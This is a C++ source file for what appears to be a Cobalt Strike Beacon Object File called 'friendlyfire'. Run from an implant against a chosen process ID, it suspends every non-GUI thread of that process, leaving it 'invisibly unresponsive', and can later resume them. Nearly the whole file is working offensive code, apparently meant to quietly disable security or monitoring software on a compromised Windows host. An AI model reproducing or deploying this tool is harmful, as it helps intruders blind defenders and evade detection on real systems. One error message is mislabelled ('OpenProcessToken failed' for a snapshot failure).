#include <Windows.h>
#include <winuser.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "base\helpers.h"


#ifdef _DEBUG
#include "base\mock.h"
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Kernel32.lib")
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {
#include "beacon.h"

    DFR(KERNEL32, GetLastError);
    #define GetLastError KERNEL32$GetLastError 

    DFR(USER32, EnumThreadWindows);
    #define EnumThreadWindows USER32$EnumThreadWindows

    DFR(KERNEL32, CreateToolhelp32Snapshot);
    #define CreateToolhelp32Snapshot KERNEL32$CreateToolhelp32Snapshot

    DFR(KERNEL32, Thread32First);
    #define Thread32First KERNEL32$Thread32First

    DFR(KERNEL32, OpenThread);
    #define OpenThread KERNEL32$OpenThread

    DFR(KERNEL32, ResumeThread);
    #define ResumeThread KERNEL32$ResumeThread

    DFR(KERNEL32, SuspendThread);
    #define SuspendThread KERNEL32$SuspendThread

    DFR(KERNEL32, CloseHandle);
    #define CloseHandle KERNEL32$CloseHandle

    DFR(KERNEL32, Thread32Next);
    #define Thread32Next KERNEL32$Thread32Next

    DFR(MSVCRT, strcmp);
    #define strcmp MSVCRT$strcmp

    int go(char* args, int len);        
}

// Structure used to flag if a thread owns a window.
typedef struct _EnumData {
    BOOL found;
} EnumData;

// Helper fn for argparsing
char* BeaconDataExtractOrNull(datap* parser, int* size)
{
    char* result = BeaconDataExtract(parser, size);
    // Check whether result is NULL already so we don't crash by dereferencing a null pointer
    if (result == NULL)
        return result;
    else
        return result[0] == '\0' ? NULL : result;
}

// Callback for EnumThreadWindows: if any window is found for a thread, mark it.
BOOL CALLBACK EnumThreadWndProc(HWND hwnd, LPARAM lParam) {
    EnumData* pData = (EnumData*)lParam;
    pData->found = TRUE;
    return FALSE; // Stop enumeration once a window is found
}

// Returns TRUE if the thread (identified by its thread ID) owns any window.
BOOL IsGuiThread(DWORD dwThreadId) {
    EnumData data = { FALSE };
    EnumThreadWindows(dwThreadId, EnumThreadWndProc, (LPARAM)&data);
    return data.found;
}


int go(char* args, int len)
{
    datap parser;
    DWORD pid = NULL;
    char* resume = NULL;
    BOOL resumeMode = FALSE;
    HANDLE hSnapshot;
    DWORD dwErrorCode = 0;
    THREADENTRY32 te;
    BOOL suspendedAtLeastOne = FALSE;

    BeaconDataParse(&parser, args, len);
    pid = BeaconDataInt(&parser);
    resume = BeaconDataExtractOrNull(&parser, NULL);

    if (!pid) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Please specify a target PID.");
        return EXIT_FAILURE;
    }

    if (resume && strcmp(resume, "resume") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Resuming suspended non-UI threads.");
        resumeMode = TRUE;
    }

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        dwErrorCode = GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcessToken failed. GetLastError returned: %d\n", dwErrorCode);
        return EXIT_FAILURE;
    }

    te.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hSnapshot, &te) == FALSE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Thread32First failed.\n");
        CloseHandle(hSnapshot);
        return 1;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Shooting threads with friendly fire...\n");

    do {
        if (te.th32OwnerProcessID == pid) {
            // Only act on non-GUI threads.
            if (!IsGuiThread(te.th32ThreadID)) {
                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                if (hThread) {
                    if (resumeMode) {
                        if (ResumeThread(hThread) == (DWORD) -1) {
                            BeaconPrintf(CALLBACK_ERROR,"[-] Failed to resume thread %d\n", te.th32ThreadID);
                        }
                        else {
                            BeaconPrintf(CALLBACK_OUTPUT,"[+] Resumed thread %d\n", te.th32ThreadID);
                        }
                    }
                    else {
                        if (SuspendThread(hThread) == (DWORD) -1 ) {
                            BeaconPrintf(CALLBACK_ERROR,"[-] Failed to suspend thread %d\n", te.th32ThreadID);
                        }
                        else {
                            suspendedAtLeastOne = TRUE;
                        }
                    }
                    CloseHandle(hThread);
                }
                else {
                    BeaconPrintf(CALLBACK_ERROR,"[-] Unable to open thread %d (insufficient privileges?)\n", te.th32ThreadID);
                }
            }
            else {
                BeaconPrintf(CALLBACK_OUTPUT,"[*] Skipping GUI thread %d\n", te.th32ThreadID);
            }
        }
    } while (Thread32Next(hSnapshot, &te));

    if (suspendedAtLeastOne) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Suspended process non-UI threads for PID: %d\n", pid);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Process is now invisibly unresponsive. Use 'friendlyfire %d resume' to restore the process.\n", pid);
    }
    else if (!resumeMode) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No threads found for that process.\n");
    }

    CloseHandle(hSnapshot);
    return EXIT_SUCCESS;
}

//================================= DEBUG STUFF

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);

}
#endif